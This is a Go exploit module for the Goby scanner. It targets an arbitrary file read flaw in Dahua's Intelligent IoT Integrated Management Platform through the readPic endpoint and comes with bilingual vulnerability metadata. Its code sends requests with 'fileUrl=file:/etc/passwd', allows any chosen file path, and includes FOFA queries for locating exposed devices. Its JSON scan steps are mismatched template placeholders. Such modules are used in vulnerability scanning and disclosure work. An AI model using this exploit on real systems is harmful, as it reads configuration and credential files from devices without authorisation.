package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua Intelligent IOT Integrated Management Platform /evo-apigw/evo-cirs/file/readPic File Read Vulnerability",
    "Description": "<p>Dahua Intelligent IoT Integrated Management Platform is a comprehensive IoT solution for enterprises and organisations to manage and monitor various devices and resources. The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Product": "Dahua Intelligent IOT Integrated Management Platform",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2024-06-27",
    "PostTime": "2024-06-27",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"*客户端会小于800*\" && body=\"/static/logo_blue.ico\" && body=\"<title>...</title>\" && body=\"location.hash.indexOf('#/message/')\"",
    "GobyQuery": "body=\"*客户端会小于800*\" && body=\"/static/logo_blue.ico\" && body=\"<title>...</title>\" && body=\"location.hash.indexOf('#/message/')\"",
    "Level": "1",
    "Impact": "<p>The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"http://www.example.com\">https://www.dahuatech.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "大华智能物联综合管理平台 /evo-apigw/evo-cirs/file/readPic 文件读取漏洞",
            "Product": "大华智能物联综合管理平台",
            "Description": "<p>大华智能物联综合管理平台是一个综合性的物联网解决方案，主要用于企业和组织管理和监控各类设备和资源。攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置⽂件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.dahuatech.com/\" target=\"_blank\">https://www.dahuatech.com/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置⽂件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Dahua Intelligent IOT Integrated Management Platform /evo-apigw/evo-cirs/file/readPic File Read Vulnerability",
            "Product": "Dahua Intelligent IOT Integrated Management Platform",
            "Description": "<p>Dahua Intelligent IoT Integrated Management Platform is a comprehensive IoT solution for enterprises and organisations to manage and monitor various devices and resources. The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "Recommendation": "<p>Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"http://www.example.com\" target=\"_blank\">https://www.dahuatech.com/</a><br></p>",
            "Impact": "<p>The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10963"
}`

	postOrGet_AAAAA := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:" + fileUrl + ""
		resp, err := setGetRequest(hostInfo, path, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/evo-apigw/evo-cirs/file/readPic"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "/bin",
			}
			// 函数继承
			uploadFileFunc := postOrGet_AAAAA

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "/bin"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_AAAAA

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
